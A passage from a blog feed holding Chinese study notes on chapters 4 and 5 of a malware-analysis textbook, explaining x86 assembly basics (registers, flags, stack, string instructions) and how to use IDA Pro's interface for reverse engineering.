alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b5020b48cbe7.jpg" class="lazyload"></a></p><p><a href="https://i.loli.net/2018/07/19/5b5020b4a4747.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b5020b4a4747.jpg" class="lazyload"></a></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;看雪-京东-2018CTF-helloctf&quot;&gt;&lt;a href=&quot;#看雪-京东-2018CTF-helloctf&quot; class=&quot;headerlink&quot; title=&quot;看雪.京东 2018CTF helloctf&quot;&gt;&lt;/a&gt;看雪.京东 2018CTF</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>第4章 x86反汇编速成班</title>
    <link href="https://kabeor.github.io/%E7%AC%AC4%E7%AB%A0%20x86%E5%8F%8D%E6%B1%87%E7%BC%96%E9%80%9F%E6%88%90%E7%8F%AD/"/>
    <id>https://kabeor.github.io/%E7%AC%AC4%E7%AB%A0%20x86%E5%8F%8D%E6%B1%87%E7%BC%96%E9%80%9F%E6%88%90%E7%8F%AD/</id>
    <published>2018-07-18T16:00:00.000Z</published>
    <updated>2020-03-16T04:23:52.503Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第4章-x86反汇编速成班"><a href="#第4章-x86反汇编速成班" class="headerlink" title="第4章 x86反汇编速成班"></a>第4章 x86反汇编速成班</h1><h2 id="4x1-抽象层次"><a href="#4x1-抽象层次" class="headerlink" title="4x1 抽象层次"></a>4x1 抽象层次</h2><blockquote><p>恶意代码分析时的三种编码层次<br><a href="https://i.loli.net/2018/07/19/5b501e70df5dd.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501e70df5dd.jpg" class="lazyload"></a></p></blockquote><blockquote><p>计算机系统的六个抽象层次</p></blockquote><p><strong>硬件</strong>   硬件层是唯一的一个物理层，由电子电路组成。这些电路实现了XOR门、AND门、OR门和NOT门等逻辑运算器的复杂组合，称为数字逻辑（digital logic）。由于物理特性，硬件很难被软件所操纵。</p><p><strong>微指令</strong>  微指令层又称为固件（firmware）。微指令只能在为它设计的特定电路上执行。这层由一些微指令构成，它们从更高的机器码层翻译而来，提供了访问硬件的接口。当分析恶意代码时，我们通常不关心微指令，因为它们通常是为特定的计算机硬件设计的。</p><p><strong>机器码</strong>  机器码层由操作码（opcode ）组成，操作码是一 些十六进制形式的数字，用于告诉处理器你想要它做什么。机器码一般由多条微指令实现，这样底层硬件就能实际执行代码了。而机器码本身又由高级语言编写的计算机程序编译而来。</p><p><strong>低级语言</strong>  低级语言是计算机体系结构指令集的人类易读版本，主要是汇编语言。恶意代码分析师使用这一层，因为对人来说，机器码太难理解了。我们使用反汇编器来生成低级语言的文本，这些文本由一些简单的助记符组成，如mov和jmp。</p><p><strong>高级语言</strong> 大部分程序员使用高级语言。高级语言对机器层做了很强的抽象，从而可以很轻松地使用程序逻辑和流控制机制。高级语言包括C、C＋＋等。它们被一个编译器经过称为编译的过程转化为机器码。</p><p><strong>解释性语言</strong>  解释型语言位于最高层。很多程序员使用诸如C＃、Perl、.NET、Java等解释语言。这一层的代码不会被编译为机器码，而是被翻译为了字节码。字节码 （bytecode）是特定于该语言的一种中间表示，它在解释器中执行。解释器（interpreter）是一个在运行时将字节码实时翻译为可执行机器码的程序。相比于传统被编译的代码，解释器提供了一种自动的抽象层次，因为它可以独立于操作系统，自己处理错误和管理内存。</p><h2 id="4x2-逆向工程"><a href="#4x2-逆向工程" class="headerlink" title="4x2 逆向工程"></a>4x2 逆向工程</h2><blockquote><p>恶意代码存储在磁盘上时，通常是机器码层的二进制形式。前面提到，机器码是一种计算机可以快速高效执行的代码形式。而我们反汇编恶意代码，就是使用反汇编器（disassembler），将恶意代码二进制文件作为输入，输出汇编语言代码。</p></blockquote><blockquote><p>汇编语言实际上是一类语言的统称。每种汇编语言的方言，都是用来对一 类微处理器家族编程的，例如，x86、x64、SPARC、PowerPC、MIPS、ARM 等。目前，x86是PC上最流行的体系结构。</p></blockquote><blockquote><p>x86，又称为IntelIA-32，是大部分32位PC使用的体系结构，微软目前所有的32位Windows系统也都运行在 x86上。此外，大部分运行在AM D64和Intel64体系结构上的W indows也都支持x86的32位二进制程序。正因如此，大部分恶意代码是为x86编译的。</p></blockquote><h2 id="4x3-x86体系结构"><a href="#4x3-x86体系结构" class="headerlink" title="4x3 x86体系结构"></a>4x3 x86体系结构</h2><p>大部分现代计算机体系结构（包括x86）在内部实现上遵循冯·诺依曼结构。这种结构包含3种硬件组件：</p><blockquote><p>•    中央处理单元（ CPU ），负责执行代码<br>•    内存（RAM），负责存储所有的数据和代码。<br>•    输入／输出系统（IO），为硬盘、键盘、显示器等设备提供接口。</p></blockquote><p>指针（instruction pointer）的寄存器（register）从内存取得要执行的指令，这个寄存器中存有指令的地址。寄存器是CPU中数据的基本存储单元，通过它，很多时候CPU不再需要访问内存，从而节省了时间。算术逻辑单元（arithmetic logic unit, ALU）执行从内存取来的指令，并将结果放到寄存器或内存中。一条条取指令、执行指令的过程不断重复，就形成了程序的运行。</p><p>冯诺依曼体系结构<br><a href="https://i.loli.net/2018/07/19/5b501e7100c59.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501e7100c59.jpg" class="lazyload"></a></p><h3 id="1-内存"><a href="#1-内存" class="headerlink" title="1.内存"></a>1.内存</h3><p>一个程序的内存可分为如下四个主要的节<br><a href="https://i.loli.net/2018/07/19/5b501e71145f6.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501e71145f6.jpg" class="lazyload"></a></p><blockquote><p><strong>数据</strong> 这个词指的是内存中一 个特定的节，名为数据节 （data section），其中包含了一 些值。这些值在程序初始加载时被放到这里，称为静态值（static value），因为程序运行时它们可能并不发生变化，还可以称为全局值（global value），因为程序的任何部分都可以使用它们。</p></blockquote><blockquote><p><strong>代码</strong> 代码节包含了在执行程序任务时CPU所取得的指令。这些代码决定了程序是做什么的，以及程序中的任务如何协调工作。</p></blockquote><blockquote><p><strong>堆</strong> 堆是为程序执行期间需要的动态内存准备的，用于创建（分配）新的值，以及消除（释放）不再需要的值。将其称为动态内存（dynamic memory），是因为其内容在程序运行期间经常被改变。</p></blockquote><blockquote><p><strong>栈</strong> 栈用于函数的局部变量和参数，以及控制程序执行流。</p></blockquote><h3 id="2-指令"><a href="#2-指令" class="headerlink" title="2. 指令"></a>2. 指令</h3><p>指令是汇编程序的构成块。在x86、汇编语言中，一条指令由一个助记符，以及零个或多个操作数组成。</p><h3 id="3-操作码和字节序"><a href="#3-操作码和字节序" class="headerlink" title="3. 操作码和字节序"></a>3. 操作码和字节序</h3><p>每条指令使用操作码告诉CPU程序要执行什么样的操作。<br>反汇编器将操作码翻译为人类易读的指令。</p><p>数据的字节序（enclianness）是指在一个大数据项中，最高位（大端，big-endian）还是最低位（小端，little-enclian）被排在第一位 （即排在最低的地址上）。</p><h3 id="4-操作数"><a href="#4-操作数" class="headerlink" title="4. 操作数"></a>4. 操作数</h3><p>操作数说明指令要使用的数据。有以下三种类型：</p><blockquote><p>立即数（immediate）操作数是一个固定的值<br>寄存器（register）操作数指向寄存器<br>内存地址（memory address）操作数指向感兴趣的值所在的内存地址，一般由方括号内包含值、寄存器或方程式组成，如［eax］。</p></blockquote><h3 id="5-寄存器"><a href="#5-寄存器" class="headerlink" title="5. 寄存器"></a>5. 寄存器</h3><p>寄存器是可以被CPU使用的少量数据存储器，访问其中内容的速度会比访问其他存储器要快。x86处理器中有一组寄存器，可以用于临时存储或者作为工作区。</p><p>最常用的x86寄存器，可以将它们归为以下四类：</p><blockquote><p>通用寄存器，CPU在执行期间使用。<br>段寄存器，用于定位内存节。<br>状态标志，用于做出决定。<br>指令指针，用于定位要执行的下一条指令。</p></blockquote><p>x86寄存器<br><a href="https://i.loli.net/2018/07/19/5b501e712850c.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501e712850c.jpg" class="lazyload"></a></p><p>所有通用寄存器的大小都是32位，可以在汇编代码中以32位或16位引用。</p><p>有4个寄存器（EAX、EBX、ECX、EDX）还可以8位值的方式引用，从而使用其最低的8位，或次低的8位。</p><p><strong>通用寄存器</strong>  通用寄存器一般用于存储数据或内存地址，而且经常交换着使用以完成程序。不过，虽然它们被称为通用寄存器，但它们并不完全通用。</p><p>一些x86指令只能使用特定的寄存器。例如，乘法和除法指令就只能使用EAX和EDX。</p><p><strong>标志寄存器</strong>  EFLAGS寄存器是一个标志寄存器。在x86架构中，它是32位的，每一位是一个标志。在执行期间，每一位表示要么是置位（值为1），要么是清除（值为0），并由这些值来控制CPU 的运算，或者给出某些CPU运算的值。</p><p>对恶意代码分析来说，最重要的一些标志介绍如下：</p><blockquote></blockquote><p><strong>ZF</strong>  当一个运算的结果等于0时，ZF被置位，否则被清除。<br><strong>CF</strong>  当一个运算的结果相对于目标操作数太大或太小时，CF被置位，否则被清除。<br><strong>SF</strong>  当一 个运算的结果为负数，SF被置位；若结果为正数，SF被清除。对算术运算，当运算结果的最高位值为l时，SF也会被置位。<br><strong>TF</strong> TF用于调试。当它被置位时，x86处理器每次只执行一条指令。</p><p><strong>EIP指令指针</strong><br>在x86架构中，EIP寄存器，又称为指令指针或程序计数器，保存了程序将要执行的下一条指令在内存中的地址。EIP的唯一作用就是告诉处理器接下来要做什么。</p><blockquote><p>注意：当EIP被破坏（即指向了一个不包含合法程序代码的内存地址 ）时，CPU 无法取得一条合法指令来执行，此时正在运行的程序就可能崩溃。当你控制了EIP，也就控制了CPU将要执行什么，这也就是为什么攻击者试图通过漏洞利用获得对EIP的控制。通常，攻击者先妥使攻击代码进入内存，然后改变EIP使其指向那段代码，从而攻击系统。</p></blockquote><h3 id="6-简单指令"><a href="#6-简单指令" class="headerlink" title="6. 简单指令"></a>6. 简单指令</h3><h4 id="mov"><a href="#mov" class="headerlink" title="mov"></a><strong>mov</strong></h4><p>用于将数据从一个位置移动到另一个位置</p><p>mov指令可以将数据移动到寄存器或内存，其格式是：mov destination, source</p><p>由方括号括起来的操作数是对内存中数据的引用。例如，［ebx]指向内存中地址为EBX处的数据。</p><h4 id="lea"><a href="#lea" class="headerlink" title="lea"></a><strong>lea</strong></h4><p>lea指令用来将一个内存地址赋给目的操作数。</p><p> “load effective address“（加载有效地址）的缩写。它的格式是lea destination, source。</p><p>例如，lea eax, [ebx+8］就将EBX+8的值给EAX。</p><p>lea指令并非专门用于计算内存地址。它还被用来计算普通的值，因为它所需的指令更少。</p><h4 id="算术运算"><a href="#算术运算" class="headerlink" title="算术运算"></a>算术运算</h4><p>加法和减法是从目标操作数中加上或减去一个值。</p><p>加法指令的格式是add destination, value。</p><p>减法的指令是sub destination, value。<br>sub指令会修改两个重要的标志：ZF和CF。<br>如果结果为零，ZF被置位；如果目标操作数比要减去的值小，则CF被置位。</p><p>inc和dec指令将一个寄存器加一和减一 。</p><p><a href="https://i.loli.net/2018/07/19/5b501e713bdd5.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501e713bdd5.jpg" class="lazyload"></a></p><p>乘法和除法都使用了一个预先规定的寄存器，因此其指令很简单，就是指令码加上寄存器要去乘或除的值。</p><p>mul指令的格式是mul value;<br>div指令的格式是div value。</p><p>mul或div指令要操作的寄存器一般会在之前许多条指令的地方被赋值，因此你可能需要在程序的上下文中来寻找。</p><p><a href="https://i.loli.net/2018/07/19/5b501e7150bf6.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501e7150bf6.jpg" class="lazyload"></a></p><p>mul value指令总是将eax乘上value。因此，EAX寄存器必须在乘法指令出现前就赋值好。乘法的结果以64位的形式分开存储在两个寄存器中：EDX和EAX。其中，EDX存储了高的32位，EAX存储低的32位。</p><p>div value指令将EDX和EAX合起来存储的64位值除以value。因此，在做除法之前，EDX和EAX这两个寄存器必须赋值好。除法的商将存储到EAX，余数则存储在EDX中。</p><p><strong>模（mod）</strong>运算会被编译为在div指令后取EDX寄存器的值（因为除法保留了余数）</p><h4 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h4><p>x86架构还使用逻辑运算符，例如OR、AND和XOR。其相应指令的用法与add和sub类似，对源操作数和目的操作数做相应的操作，并将结果保存在目的操作数中。</p><p><em>xor eax, eax就一种将EAX寄存器快速置0的方法。这么做是为了优化，因为这条指令只需要2个字节，而mov eax, 0需要5个字节。</em></p><p>shr和shl指令用于对寄存器做移位操作。</p><p>shr指令的格式是 “shr destination, count”<br>shl指令的格式是 “shl destination, count” </p><p>shr和shl指令对目的操作数右移或左移，由count决定移多少位。移出目的操作数边界的位则会先移动到CF标志位中。在移位时，使用0填充新的位。移位运算全部完成后，CF标志位中就包含了最后移出目的操作数的那一位。</p><p>循环移位指令ror和rol与移位指令类似，但移出的那一位会被填到另一端空出来的位上，即右循环移位（ror）会将最低位循环移到最高位；左循环移位Crol)则相反。</p><p>移位经常被用于对乘法运算的优化。由于不需要像乘法那样设置寄存器、移动数据，移位会更简单、更快。</p><p>在分析恶意代码时，如果遇到一个函数中只有xor、or、and、shl、ror、shr、rol这样的指令，并且它们反复出现，看起来随机排列的样子，就可能是遇到了一个加密或者压缩函数。最好是将其标记为一个加密函数，然后继续后面的分析。</p><p><a href="https://i.loli.net/2018/07/19/5b501e7165db8.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501e7165db8.jpg" class="lazyload"></a></p><h4 id="NOP指令"><a href="#NOP指令" class="headerlink" title="NOP指令"></a><strong>NOP指令</strong></h4><p>当它出现时，直接执行下一条指令。</p><p>这条指令的opcode是Ox90。在缓冲区溢出攻击中，当攻击者无法完美地控制利用代码，就经常使用NOP滑板。它起到了填充代码的作用，以降低shellcode可能在中间部分开始执行所造成的风险。</p><h3 id="7-栈"><a href="#7-栈" class="headerlink" title="7. 栈"></a>7. 栈</h3><p>用于函数的内存、局部变量、流控制结构等被存储在栈中。</p><p>栈是一种用压和弹操作来刻画的数据结构，向战中压入一些东西，然后再把它们弹出来。</p><p>它是一种后入先出（LIFO）的结构。</p><p>与栈有关的指令包括push、pop、call、leave、enter、和ret。在内存中，栈被分配成自顶向下的，最高的地址最先被使用。当一个值被压入战时，使用低一点的地址。</p><p>栈只能用于短期存储。它经常用于保存局部变量、参数和返回地址。其主要用途是管理函数调用之间的数据交换。而不同的编译器对这种管理方法的具体实现有所不同，但大部分常见约定都使用相对EBP的地址来引用局部变量与参数。</p><h4 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h4><p>许多函数包含一 段 “序言” （prologue），它是在函数开始处的少数几行代码，用于保存函数中要用到的栈和寄存器。相应的，在函数结尾的 “结语” （epilogue）则将技和这些寄存器恢复至函数被调用前的状态。</p><p>下面列举了函数调用最常见的实现流程</p><blockquote><ol><li>使用push指令将参数压入栈中。</li><li>使用call memory_location来调用函数。此时，当前指令地址（指EIP寄存器中的内容）被压入栈中。这个地址会在函数结束后，被用于返回到主代码。当函数开始执行时，EIP的值被设为memory_location （即函数的起始地址）。</li><li>通过函数的序言部分，分配栈中用于局部变量的空间，EBP （基址指针）也被压入栈中。这样就达到了为调用函数保存EBP的目的。</li><li>函数开始做它的工作。</li><li>通过函数的结语部分，恢复。调整E回来释放局部变量，恢复EBP，以使得调用函数可以准确地定位它的变量。leave指令可以用作结语，因为它的功能是使ESP等于EBP，然后从栈中弹出EBP。</li><li>函数通过调用ret指令返回。这个指令会从栈中弹出返回地址给EIP，因此程序会从原来调用的地方继续执行。</li><li>调整栈，以移除此前压入的参数，除非它们在后面还要被使用。</li></ol></blockquote><p>x86架构还提供了其他弹出和压入的指令，其中最常用的是pusha和pushad。它们将所有的寄存器都压入战中，并且常与popa和popad结合使用，后者从栈中弹出所有的寄存器。</p><p>pusha和pushad的具体功能如下。</p><blockquote><p>•    pusha以下面的顺序将所有16位寄存器压入栈中：AX、EX、DX 、BX 、SP、BP、SI、DI<br>• pushad以下面的顺序将所有32位寄存器压入栈中：EAX、ECX 、EDX 、EBX 、ESP、EBP、ESI、 EDI</p></blockquote><p><em>在shellcode中，如果要将寄存器的当前状态全部保存在栈上，以便稍后恢复，就常使用这些指令。编译器很少使用它们，因此，看到它们，通常说明是某人手工写的汇编代码或者shellcode。</em></p><h3 id="8-条件指令"><a href="#8-条件指令" class="headerlink" title="8. 条件指令"></a>8. 条件指令</h3><p>最常见的两个条件指令是test和cmp。</p><p>test指令与and指令的功能一样，但它并不会修改其使用的操作数。test指令只设置标志位。</p><p>对某个东西与它自身的test经常被用于检查它是否是一个NULL值。</p><p>cmp指令与sub指令的功能一样，但它不影响其操作数。cmp指令也是只用于设置标志位，其执行结果是，ZF和CF标志位可能发生变化。</p><h3 id="9-分支指令"><a href="#9-分支指令" class="headerlink" title="9. 分支指令"></a>9. 分支指令</h3><p>最常见的分支指令是跳转指令。程序中使用了大量的跳转指令，其中最简单的是jmp指令，它使得下一条要被执行的指令是其格式jmp location中指定位置的指令，又被称为无条件跳转，因为总会跳到目的位置去执行。这个简单的跳转无法满足所有的跳转需求。</p><p><a href="https://i.loli.net/2018/07/19/5b501e7188b0c.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501e7188b0c.jpg" class="lazyload"></a></p><h3 id="10-重复指令"><a href="#10-重复指令" class="headerlink" title="10. 重复指令"></a>10. 重复指令</h3><p>重复指令是一组操作数据缓冲区的指令。数据缓冲区通常是一个字节数组的形式，也可以是单字或者双字。</p><p>常见的数据缓冲区操作指令是movsx, cmpsx、stosx和scasx，其中x可以是b、w或者d，分别表示字节、字和双字。这些指令对任何形式的数据都有效。</p><p>在这些操作中，使用ESI和EDI寄存器。ESI是源索引寄存器，EDI是目的索引寄存器。还有ECX用作计数的变量。</p><p>这些指令还需要一 个前缀，用于对长度超过1的数据做操作。movsb指令本身只会移动一 个字节，而不使用ECX 寄存器。</p><p><a href="https://i.loli.net/2018/07/19/5b501e71a088e.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501e71a088e.jpg" class="lazyload"></a></p><p>在x86下，使用重复前缀来做多字节操作。rep指令会增加ESI和EDI这两个偏移，减少ECX寄存器。rep前缀会不断重复，直至ECX=O。repe／repz和repne/repnz前缀则不断重复，直至ECX=O或直至ZF= 1或0。</p><p>movsb指令用于将一串字节从一个位置移动到另一 个位置。rep前缀经常与movsb一起使用，从而复制一串长度由ECX 决定的字节。从逻辑上说，rep movsb指令等价于C语言的memcpy函数。movsb指令从ESI指向地址取出一 个字节，将其存入ED I指向地址，然后根据方向标志（DF）的设置，将ESI和EDI的值加1或者减1。如果DF=O，则加，否则减。</p><p>在由C代码编译后的结果中，很少能看到DF标志。但是在shellcode里，人们有时候会调换方向标志，这样就可以反方向存储数据。如果有rep前缀，就会检查ECX是否为0，如果不等于0，则指令继续从ESI移动一个字节到EDI并将ECX 寄存器减1。这个过程会不断重复，直至ECX=0。</p><p>cmpsb指令用于比较两串字节，以确定其是否是相同的数据。cmpsb指令用ESI指向地址的字节减去EDI指向地址的字节，并更新相关的标志位。它经常与repe前缀一起使用。此时，cmpsb指令逐一比较两串字节，直至发现一处不同，或比较到头。cmpsb指令从地址ESI获得一 个字节，将其与ED I指向位置的字节进行比较，并设置标志位，然后对ESI和EDI分别加1。如果有「epe前缀，就检查ECX的值和标志位，如果ECX=O或者ZF=O，就停止重复。这相当于C语言中的memcmp函数。</p><p>scasb指令用于从一串字节中搜索一 个值。这个值由AL寄存器给出。它的工作方式与cmpsb一样，但是它是将ESI指向地址的字节与AL进行比较，而不是与EDI指向地址的字节比较。repe操作会使得这个比较不断继续，直到找到该字节，或者ECX=O。如果在这串字节中找到了那个值，则其位置会被存储在ESI中。</p><p>stosb指令用于将值存储到EDI指向的地址。它与scasb一样，但不是去搜索，而是将指定的字节存入EDI指向的地址。rep前缀与scasb一起使用后，就初始化了一段内存缓冲区，其中的每个字节都是相同的值。这等价于C语言的memset函数。</p><p><a href="https://i.loli.net/2018/07/19/5b501e71b359d.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501e71b359d.jpg" class="lazyload"></a><br><a href="https://i.loli.net/2018/07/19/5b501e7e0729d.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501e7e0729d.jpg" class="lazyload"></a></p><h3 id="11-C语言主函数和偏移"><a href="#11-C语言主函数和偏移" class="headerlink" title="11. C语言主函数和偏移"></a>11. C语言主函数和偏移</h3><p>一个标准C程序的主函数有两个参数，形式如下：<br><code>int main(int argc, char** argv)</code><br>参数argc和argv在运行时决定。其中，参数argc是一个整数，说明了命令行中参数的个数，包括程序名字本身：参数argv是一个字符串数据指针，指向了所有的命令行参数。</p><p><a href="https://i.loli.net/2018/07/19/5b501e7e24a3e.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501e7e24a3e.jpg" class="lazyload"></a><br><a href="https://i.loli.net/2018/07/19/5b501e7e38f9b.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501e7e38f9b.jpg" class="lazyload"></a></p><h3 id="12-更多信息：Intel×86-Architecture-Manual"><a href="#12-更多信息：Intel×86-Architecture-Manual" class="headerlink" title="12. 更多信息：Intel×86 Architecture Manual"></a>12. 更多信息：Intel×86 Architecture Manual</h3><p><a href="https://i.loli.net/2018/07/19/5b501e7e50e23.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501e7e50e23.jpg" class="lazyload"></a><br><a href="https://i.loli.net/2018/07/19/5b501e7e66ddb.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501e7e66ddb.jpg" class="lazyload"></a></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;第4章-x86反汇编速成班&quot;&gt;&lt;a href=&quot;#第4章-x86反汇编速成班&quot; class=&quot;headerlink&quot; title=&quot;第4章 x86反汇编速成班&quot;&gt;&lt;/a&gt;第4章 x86反汇编速成班&lt;/h1&gt;&lt;h2 id=&quot;4x1-抽象层次&quot;&gt;&lt;a</summary>
        
      
    
    
    
    <category term="病毒分析" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    <category term="《恶意代码分析实战》笔记" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
    
    <category term="第二篇 静态分析高级技术篇" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/%E7%AC%AC%E4%BA%8C%E7%AF%87-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E9%AB%98%E7%BA%A7%E6%8A%80%E6%9C%AF%E7%AF%87/"/>
    
    
    <category term="病毒分析" scheme="https://kabeor.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>第5章 IDA Pro</title>
    <link href="https://kabeor.github.io/%E7%AC%AC5%E7%AB%A0%20IDA%20Pro/"/>
    <id>https://kabeor.github.io/%E7%AC%AC5%E7%AB%A0%20IDA%20Pro/</id>
    <published>2018-07-18T16:00:00.000Z</published>
    <updated>2020-03-16T04:24:13.552Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第5章-IDA-Pro"><a href="#第5章-IDA-Pro" class="headerlink" title="第5章 IDA Pro"></a>第5章 IDA Pro</h1><p>本章介绍了IDA Pro的使用方法，本文就只大致记录常用功能</p><h2 id="5x1-加载一个可执行文件"><a href="#5x1-加载一个可执行文件" class="headerlink" title="5x1 加载一个可执行文件"></a>5x1 加载一个可执行文件</h2><p>默认情况下，IDA Pro反汇编代码中不包含PE头或资源节，这些地方常被恶意代码用来隐藏恶意指令，我们可以指定手动加载</p><h2 id="5x2-IDA-Pro接口"><a href="#5x2-IDA-Pro接口" class="headerlink" title="5x2 IDA Pro接口"></a>5x2 IDA Pro接口</h2><h3 id="1-反汇编窗口模式"><a href="#1-反汇编窗口模式" class="headerlink" title="1. 反汇编窗口模式"></a>1. 反汇编窗口模式</h3><blockquote><p>图形模式</p></blockquote><p>显示行号的操作码：Options-&gt;General，选择Line prefixes并设置Number of Opcode Bytes为6.（如果这些设置让所有指令都在屏幕右对齐，尝试设置Instruction Indentation为8）</p><p>箭头颜色：</p><ol><li>红色：一个条件跳转没有被采用</li><li>绿色：这个条件跳转被采用</li><li>蓝色：一个无条件跳转被采用</li></ol><blockquote><p>文本模式</p></blockquote><p>打开自动注释： Options-&gt;General，选择Auto comments</p><h3 id="2-对分析有用的窗口"><a href="#2-对分析有用的窗口" class="headerlink" title="2. 对分析有用的窗口"></a>2. 对分析有用的窗口</h3><blockquote><p>函数窗口<br>名字窗口<br>字符串窗口<br>导入表窗口<br>导入表窗口<br>结构窗口</p></blockquote><h3 id="3-返回到默认窗口"><a href="#3-返回到默认窗口" class="headerlink" title="3. 返回到默认窗口"></a>3. 返回到默认窗口</h3><p>Windows-&gt;Reset Desktop<br>Windows-&gt;Save desktop   保存新视图</p><h3 id="4-导航IDA-Pro"><a href="#4-导航IDA-Pro" class="headerlink" title="4. 导航IDA Pro"></a>4. 导航IDA Pro</h3><blockquote><p>使用链接和交叉引用<br>浏览历史<br>导航栏<br>    1. 浅蓝色： 被FLIRT识别的库代码<br>    2. 红色： 编译器生成的代码<br>    3. 深蓝色： 用户编写的代码<br>    4. 粉红色： 导入的数据<br>    5. 灰色： 已定义的数据<br>    6. 棕色： 未定义的数据<br>跳转到位置   <strong>G</strong></p></blockquote><h3 id="5-搜索"><a href="#5-搜索" class="headerlink" title="5. 搜索"></a>5. 搜索</h3><blockquote><p>Search-&gt;Next Code  移动光标到包含你所指定的指令的下一个位置<br>Search-&gt;Text  在整个反汇编窗口中搜索一个指定的字符串<br>Search-&gt;Sequence of Bytes  在十六进制视图窗口中对一个特定字节序列执行二进制搜索</p></blockquote><h2 id="5x3-使用交叉引用"><a href="#5x3-使用交叉引用" class="headerlink" title="5x3 使用交叉引用"></a>5x3 使用交叉引用</h2><p>交叉引用（xref）<br>查看一个函数的所有交叉引用：单机函数名并按X键</p><h2 id="5x4-分析函数"><a href="#5x4-分析函数" class="headerlink" title="5x4 分析函数"></a>5x4 分析函数</h2><p>创建函数：  P<br>无法识别出基于EBP的一个栈帧的修复： 按Alt+P，选择BP Based Frame，然后指定4 bytes for Saved Registers</p><h2 id="5x5-使用图形选项"><a href="#5x5-使用图形选项" class="headerlink" title="5x5 使用图形选项"></a>5x5 使用图形选项</h2><p><a href="https://i.loli.net/2018/07/19/5b501e9930e37.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/19/5b501e9930e37.jpg" class="lazyload"></a></p><h2 id="5x6-增强反汇编"><a href="#5x6-增强反汇编" class="headerlink" title="5x6 增强反汇编"></a>5x6 增强反汇编</h2><p>IDA Pro没有撤销</p><ol><li>重命名</li><li>注释：将光标放在反汇编的某行上，并按冒号（:）</li><li>格式化操作数</li><li>使用命名的常量—-手动加载有关类型库：选择View-&gt;Open Subviews-&gt;Type Libraries</li><li>重新定义代码和数据<ol><li>按U取消函数，代码或数据的定义</li><li>按C定义原始字节为代码</li><li>按D定义原始字节为数据</li><li>按A定义原始字节为ASCII字符串</li></ol></li></ol><h2 id="5x7-用插件扩展IDA"><a href="#5x7-用插件扩展IDA" class="headerlink" title="5x7 用插件扩展IDA"></a>5x7 用插件扩展IDA</h2><h3 id="1-IDC脚本"><a href="#1-IDC脚本" class="headerlink" title="1. IDC脚本"></a>1. IDC脚本</h3><p>File-&gt;Script File   简单运行<br>File-&gt;IDC Command  作为单独命令运行</p><h3 id="2-IDAPython"><a href="#2-IDAPython" class="headerlink" title="2. IDAPython"></a>2. IDAPython</h3><h3 id="3-使用商业插件"><a href="#3-使用商业插件" class="headerlink" title="3. 使用商业插件"></a>3. 使用商业插件</h3><p>Hex-Rays生成伪代码<br>zynamics BinDiff比较两个IDA Pro数据库</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;第5章-IDA-Pro&quot;&gt;&lt;a href=&quot;#第5章-IDA-Pro&quot; class=&quot;headerlink&quot; title=&quot;第5章 IDA Pro&quot;&gt;&lt;/a&gt;第5章 IDA Pro&lt;/h1&gt;&lt;p&gt;本章介绍了IDA</summary>
        
      
    
    
    
